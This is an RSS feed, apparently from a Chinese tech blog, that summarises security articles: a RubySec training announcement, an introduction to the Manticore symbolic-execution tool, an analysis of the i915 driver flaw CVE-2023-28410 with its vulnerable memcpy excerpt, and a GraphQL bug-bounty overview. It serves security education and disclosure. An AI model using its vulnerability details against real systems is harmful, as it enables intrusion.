<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>漏洞挖掘 on 办公AI智能小助手</title>
        <link>http://localhost:1313/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</link>
        <description>Recent content in 漏洞挖掘 on 办公AI智能小助手</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>zh-cn</language>
        <copyright>qife</copyright>
        <lastBuildDate>Sat, 09 Aug 2025 18:24:12 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/index.xml" rel="self" type="application/rss+xml" /><item>
        <title>RubySec安全实战指南 - 深入解析Ruby漏洞与防御技术</title>
        <link>http://localhost:1313/p/rubysec%E5%AE%89%E5%85%A8%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97-%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90ruby%E6%BC%8F%E6%B4%9E%E4%B8%8E%E9%98%B2%E5%BE%A1%E6%8A%80%E6%9C%AF/</link>
        <pubDate>Sat, 09 Aug 2025 18:24:12 +0800</pubDate>
        
        <guid>http://localhost:1313/p/rubysec%E5%AE%89%E5%85%A8%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97-%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90ruby%E6%BC%8F%E6%B4%9E%E4%B8%8E%E9%98%B2%E5%BE%A1%E6%8A%80%E6%9C%AF/</guid>
        <description>&lt;h3 id=&#34;rubysec实战指南发布&#34;&gt;RubySec实战指南发布
&lt;/h3&gt;&lt;p&gt;在互联网广泛使用的Ruby应用中，潜藏着可能影响大量系统的安全漏洞，这些漏洞正吸引攻击者瞄准高价值目标。其中，利用YAML格式数据序列化/反序列化等常见特性的漏洞尤为突出。经测试，几乎所有主流开源Ruby项目均存在此类隐患，但多数开发者尚未意识到风险。&lt;/p&gt;
&lt;p&gt;本《RubySec实战指南》将带您：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;剖析近期典型Ruby漏洞类型及其根本成因&lt;/li&gt;
&lt;li&gt;通过演示开发真实漏洞利用案例&lt;/li&gt;
&lt;li&gt;研究漏洞背后的通用模式&lt;/li&gt;
&lt;li&gt;制定规避漏洞的软件工程策略&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;核心学习内容&#34;&gt;核心学习内容
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;历史Rails漏洞机制与根源分析&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;反序列化缺陷的影响缓解方法&lt;/li&gt;
&lt;li&gt;基于YAML反序列化的Rack应用rootkit技术&lt;/li&gt;
&lt;li&gt;YAML反序列化漏洞的防御方案&lt;/li&gt;
&lt;li&gt;防御性Ruby编程实践&lt;/li&gt;
&lt;li&gt;高级测试技术与Mutant模糊测试&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们设计了灵活的学习路径，如需协助可随时联系。若需求集中，或将开设在线讲座。&lt;/p&gt;
&lt;p&gt;——Trail of Bits团队&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;欢迎通过&lt;a class=&#34;link&#34; href=&#34;https://twitter.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Twitter&lt;/a&gt;、&lt;a class=&#34;link&#34; href=&#34;https://linkedin.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;LinkedIn&lt;/a&gt;、&lt;a class=&#34;link&#34; href=&#34;https://github.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GitHub&lt;/a&gt;、&lt;a class=&#34;link&#34; href=&#34;https://mastodon.social&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Mastodon&lt;/a&gt;、&lt;a class=&#34;link&#34; href=&#34;https://news.ycombinator.com&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Hacker News&lt;/a&gt;分享本文&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>Manticore：面向人类的符号执行工具 - 技术解析与应用案例</title>
        <link>http://localhost:1313/p/manticore%E9%9D%A2%E5%90%91%E4%BA%BA%E7%B1%BB%E7%9A%84%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%B7%A5%E5%85%B7-%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90%E4%B8%8E%E5%BA%94%E7%94%A8%E6%A1%88%E4%BE%8B/</link>
        <pubDate>Sat, 09 Aug 2025 17:13:14 +0800</pubDate>
        
        <guid>http://localhost:1313/p/manticore%E9%9D%A2%E5%90%91%E4%BA%BA%E7%B1%BB%E7%9A%84%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E5%B7%A5%E5%85%B7-%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90%E4%B8%8E%E5%BA%94%E7%94%A8%E6%A1%88%E4%BE%8B/</guid>
        <description>&lt;h3 id=&#34;双接口设计--多样应用场景&#34;&gt;双接口设计 · 多样应用场景
&lt;/h3&gt;&lt;p&gt;Manticore提供两种使用方式：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;命令行工具&lt;/strong&gt;：快速生成程序测试用例（样本输入），每个用例对应独特执行结果（如正常退出或崩溃）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Python API&lt;/strong&gt;：支持定制化分析与应用优化，可解决以下问题：
&lt;ul&gt;
&lt;li&gt;执行到X点时变量Y是否可能为特定值？&lt;/li&gt;
&lt;li&gt;程序能否在运行时到达某段代码？&lt;/li&gt;
&lt;li&gt;如何构造触发特定代码执行的输入？&lt;/li&gt;
&lt;li&gt;用户输入是否被用作libc函数参数？&lt;/li&gt;
&lt;li&gt;函数执行次数统计&lt;/li&gt;
&lt;li&gt;给定输入下的指令执行计数&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;API核心功能还包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;丢弃无关执行状态&lt;/li&gt;
&lt;li&gt;在任意执行点运行自定义分析函数&lt;/li&gt;
&lt;li&gt;具体化符号内存&lt;/li&gt;
&lt;li&gt;内省和修改模拟机器状态&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;早期应用实例&#34;&gt;早期应用实例
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;DARPA网络大挑战&lt;/strong&gt;：作为符号执行漏洞挖掘基础组件&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;CTF实战案例&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;Eric Hennenfent：通过二进制插桩/符号执行双解法完成逆向挑战&lt;/li&gt;
&lt;li&gt;Yan与Mark：用污点符号值追踪用户输入影响范围&lt;/li&gt;
&lt;li&gt;Josselin Feist：纯API实现漏洞利用（定位崩溃点+符号执行构造约束）&lt;/li&gt;
&lt;li&gt;Cory Duplantis：解决Google CTF 2016逆向题（演示CTF解题标准化流程）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;快速入门指南&#34;&gt;快速入门指南
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;环境准备（Ubuntu 16.04）&lt;/strong&gt;：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 安装系统依赖&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt-get update &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sudo apt-get install z3 python-pip -y
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python -m pip install -U pip
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 安装Manticore&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git clone https://github.com/trailofbits/manticore.git &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; manticore
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo pip install --no-binary capstone .
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;基础使用演示&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;命令行发现测试用例：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; examples/linux
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;make
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;manticore basic
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat mcore_*/*1.stdin &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ./basic
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;API统计指令数：&lt;/li&gt;
&lt;/ol&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;cd&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;../&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;script&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;python&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;count_instructions&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;py&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;../&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;linux&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;helloworld&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;（正文完）&lt;/p&gt;
</description>
        </item>
        <item>
        <title>漏洞赏金机制的困境：从i915漏洞看ChromeOS与英特尔赏金计划的问题</title>
        <link>http://localhost:1313/p/%E6%BC%8F%E6%B4%9E%E8%B5%8F%E9%87%91%E6%9C%BA%E5%88%B6%E7%9A%84%E5%9B%B0%E5%A2%83%E4%BB%8Ei915%E6%BC%8F%E6%B4%9E%E7%9C%8Bchromeos%E4%B8%8E%E8%8B%B1%E7%89%B9%E5%B0%94%E8%B5%8F%E9%87%91%E8%AE%A1%E5%88%92%E7%9A%84%E9%97%AE%E9%A2%98/</link>
        <pubDate>Sat, 09 Aug 2025 14:24:11 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%BC%8F%E6%B4%9E%E8%B5%8F%E9%87%91%E6%9C%BA%E5%88%B6%E7%9A%84%E5%9B%B0%E5%A2%83%E4%BB%8Ei915%E6%BC%8F%E6%B4%9E%E7%9C%8Bchromeos%E4%B8%8E%E8%8B%B1%E7%89%B9%E5%B0%94%E8%B5%8F%E9%87%91%E8%AE%A1%E5%88%92%E7%9A%84%E9%97%AE%E9%A2%98/</guid>
        <description>&lt;h2 id=&#34;linux内核i915驱动线性越界读写漏洞&#34;&gt;Linux内核i915驱动线性越界读写漏洞
&lt;/h2&gt;&lt;p&gt;在分析i915驱动时发现一个线性越界读写漏洞(CVE-2023-28410)。该漏洞存在于&lt;code&gt;vm_access&lt;/code&gt;函数中，该函数通常用于调试进程，仅适用于VM_IO | VM_PFNMAP类型的VMA：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;vm_access&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;struct&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;vm_area_struct&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;area&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;long&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;          &lt;span class=&#34;kt&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;write&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;memcpy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;vaddr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 用户控制数据写入&amp;#34;固定&amp;#34;页
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nf&#34;&gt;__i915_gem_object_flush_map&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;obj&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;memcpy&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;buf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;vaddr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;addr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;len&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 从&amp;#34;固定&amp;#34;页读取数据
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;...&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;参数&lt;code&gt;len&lt;/code&gt;未经校验直接用于memcpy()：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在[1]处可能导致内存破坏/溢出&lt;/li&gt;
&lt;li&gt;在[2]处可能导致信息泄露&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;完整漏洞分析及PoC见：&lt;a class=&#34;link&#34; href=&#34;http://site.pi3.com.pl/adv/CVE-2023-28410_i915.txt&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;pi3技术公告&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;漏洞赏金计划遭遇的问题&#34;&gt;漏洞赏金计划遭遇的问题
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;响应迟缓&lt;/strong&gt;：Google在58天内未提供任何更新&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;透明度缺失&lt;/strong&gt;：漏洞被英特尔悄悄修复，声称是内部发现&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;沟通障碍&lt;/strong&gt;：多方推诿责任，缺乏有效协调&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;致谢问题&lt;/strong&gt;：修复提交使用了错误的企业邮箱(已离职的微软邮箱)&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;漏洞赏金机制的系统性缺陷&#34;&gt;漏洞赏金机制的系统性缺陷
&lt;/h2&gt;&lt;p&gt;文章指出当前漏洞赏金计划存在根本性的&amp;quot;权力失衡&amp;quot;问题：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;条款完全由企业单方面制定&lt;/li&gt;
&lt;li&gt;研究人员缺乏有效申诉渠道&lt;/li&gt;
&lt;li&gt;存在虚假宣传现象(如百万美元漏洞猎人的营销)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;技术影响范围&#34;&gt;技术影响范围
&lt;/h2&gt;&lt;p&gt;该i915驱动漏洞影响：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Google Chromebook/ChromeOS&lt;/li&gt;
&lt;li&gt;多数商务笔记本&lt;/li&gt;
&lt;li&gt;高能效笔记本&lt;/li&gt;
&lt;li&gt;所有使用英特尔集成GPU的设备&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;时间线关键节点&#34;&gt;时间线关键节点
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;2021年11月：发现漏洞&lt;/li&gt;
&lt;li&gt;2022年2月3日：报告给Google&lt;/li&gt;
&lt;li&gt;2022年3月11日：英特尔悄悄修复漏洞&lt;/li&gt;
&lt;li&gt;2022年10月：英特尔最终发布安全公告(INTEL-SA-00886)&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;行业反思&#34;&gt;行业反思
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;建立更公平的漏洞披露条款&lt;/li&gt;
&lt;li&gt;提高赏金计划透明度&lt;/li&gt;
&lt;li&gt;改善研究人员与企业间的权力平衡&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;完整的技术分析和事件细节揭示了当前漏洞赏金机制亟待改进的现状。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>GraphQL API漏洞挖掘实战：漏洞赏金案例分析</title>
        <link>http://localhost:1313/p/graphql-api%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E%E8%B5%8F%E9%87%91%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/</link>
        <pubDate>Sat, 09 Aug 2025 12:12:43 +0800</pubDate>
        
        <guid>http://localhost:1313/p/graphql-api%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E%E8%B5%8F%E9%87%91%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;graphql与未授权数据访问漏洞&#34;&gt;GraphQL与未授权数据访问漏洞
&lt;/h3&gt;&lt;p&gt;探讨了攻击者如何利用GraphQL接口绕过权限控制，获取本应受限的数据访问权限。案例包括HackerOne报告#343464等实际漏洞。&lt;/p&gt;
&lt;h3 id=&#34;graphql与未授权数据创建修改漏洞&#34;&gt;GraphQL与未授权数据创建/修改漏洞
&lt;/h3&gt;&lt;p&gt;分析了错误配置的Mutation操作如何允许攻击者非法创建或修改数据（HackerOne报告#2233480）。&lt;/p&gt;
&lt;h3 id=&#34;graphql与未授权数据删除漏洞&#34;&gt;GraphQL与未授权数据删除漏洞
&lt;/h3&gt;&lt;p&gt;通过HackerOne报告#858671案例，演示了缺乏权限验证的delete操作可能引发的数据销毁风险。&lt;/p&gt;
&lt;h3 id=&#34;graphql如何导致dos攻击&#34;&gt;GraphQL如何导致DoS攻击
&lt;/h3&gt;&lt;p&gt;解释了复杂嵌套查询可能引发的服务拒绝攻击，并引用DEF CON 32相关研究成果。&lt;/p&gt;
&lt;h3 id=&#34;graphql中的sql注入风险&#34;&gt;GraphQL中的SQL注入风险
&lt;/h3&gt;&lt;p&gt;展示了GraphQL参数未正确过滤时可能触发的SQL注入漏洞（HackerOne报告#435066）。&lt;/p&gt;
&lt;h3 id=&#34;graphql架构泄露问题&#34;&gt;GraphQL架构泄露问题
&lt;/h3&gt;&lt;p&gt;讨论了introspection功能暴露API敏感信息是否应被认定为可报告漏洞。&lt;/p&gt;
&lt;h3 id=&#34;graphql的csrf攻击面&#34;&gt;GraphQL的CSRF攻击面
&lt;/h3&gt;&lt;p&gt;分析Doyensec研究报告中提到的跨站请求伪造攻击场景，包括GitHub OAuth流程的HEAD方法CSRF绕过案例（Teddy Katz博客）。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;关键资源链接均保留原始英文URL以方便技术溯源。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>路由器固件漏洞自动化挖掘：基于污点分析的规模化漏洞检测</title>
        <link>http://localhost:1313/p/%E8%B7%AF%E7%94%B1%E5%99%A8%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E8%87%AA%E5%8A%A8%E5%8C%96%E6%8C%96%E6%8E%98%E5%9F%BA%E4%BA%8E%E6%B1%A1%E7%82%B9%E5%88%86%E6%9E%90%E7%9A%84%E8%A7%84%E6%A8%A1%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B/</link>
